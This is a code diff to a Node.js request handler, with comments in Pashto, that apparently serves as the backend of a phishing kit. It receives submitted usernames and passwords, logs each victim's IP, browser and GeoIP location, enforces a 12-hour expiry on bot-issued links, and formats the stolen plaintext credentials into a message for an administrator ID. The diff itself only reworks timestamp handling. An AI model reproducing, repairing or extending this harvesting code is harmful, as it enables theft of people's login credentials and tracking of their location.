@@ -9,24 +9,27 @@ module.exports = async (req, res) => {
   const { username, password, uid } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const userAgent = req.headers['user-agent'];
-  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });
+  const timestampNow = Date.now();
+  const timestampReadable = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });
 
   const adminId = process.env.ADMIN_ID; // ✅ اډمین ID له Environment Variable نه
 
-  // 🟢 UID پروسس
-  // uid = "Bot7703382662_403997|1693640000000"
-  let cleanUid = null;
+  // 🟢 د UID څخه اصلي ID او timestamp ایستل
+  let cleanUid = uid;
   let createdAt = null;
 
   if (uid) {
     const parts = uid.split("|");
-    cleanUid = parts[0].replace("Bot", "").split("_")[0]; 
-    createdAt = parseInt(parts[1], 10);
+    cleanUid = parts[0].replace("Bot", "").split("_")[0];  // یوزر ID
+    createdAt = parts[1] ? parseInt(parts[1]) : null;      // د جوړېدو وخت (ms)
   }
 
-  // 🟢 د وخت چک (12 ساعت = 43200000 ms)
-  if (!createdAt || (Date.now() - createdAt) > 12 * 60 * 60 * 1000) {
-    return res.status(400).send("❌ This link has expired (valid for 12 hours only).");
+  // 🟢 د وخت چک (12 ساعته = 43,200,000 ms)
+  if (createdAt) {
+    const diff = timestampNow - createdAt;
+    if (diff > 12 * 60 * 60 * 1000) {
+      return res.status(400).send("❌ This link has expired (valid for 12 hours only).");
+    }
   }
 
   // 🟢 د GeoIP معلومات
@@ -43,7 +46,7 @@ module.exports = async (req, res) => {
 ├ 👤 *Username:* \`${username}\`
 ├ 🔐 *Password:* \`${password}\`
 ├ 🆔 *User ID:* \`${uid}\`
-├ 📆 *Time:* \`${timestamp}\`
+├ 📆 *Time:* \`${timestampReadable}\`
 ├ 🌐 *IP:* \`${ip}\`
 ├ 🏙️ *City:* \`${geo.city || 'Unknown'}\`
 ├ 🌍 *Country:* ${geo.country || 'Unknown'}
